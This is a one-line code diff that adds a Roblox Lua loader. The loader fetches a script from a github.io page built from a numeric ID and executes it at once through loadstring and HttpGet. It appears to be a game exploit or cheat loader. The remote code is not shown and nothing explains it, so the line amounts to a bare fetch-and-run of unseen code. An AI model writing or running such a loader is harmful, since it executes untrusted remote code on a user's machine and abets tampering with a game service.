@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://stavratum.github.io/%d/"):format(7205641391)))()
